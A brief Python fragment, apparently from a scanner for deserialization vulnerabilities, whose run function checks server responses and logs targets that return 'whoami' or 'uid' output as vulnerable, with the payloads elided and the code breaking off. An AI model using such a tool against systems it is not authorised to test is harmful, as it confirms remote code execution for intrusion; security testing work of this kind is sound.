...
def run(ip,port,index,q):
    ...
    if ((r1.status_code == 200) and 'uid' in r1.text) or ((r2.status_code == 202) and 'Vulnerable' in r3.text):
        logging.info('[+]{}:{}  deserialization vulnerability:{}.'.format(ip,port,VUL[index]))
        q.put('[+]{}:{}  deserialization vulnerability:{}.'.format(ip,port,VUL[index]))
        logging.info('[+] permission is:{}.'.format(r1.text.replace('whoami : \r\n','')))
    else:
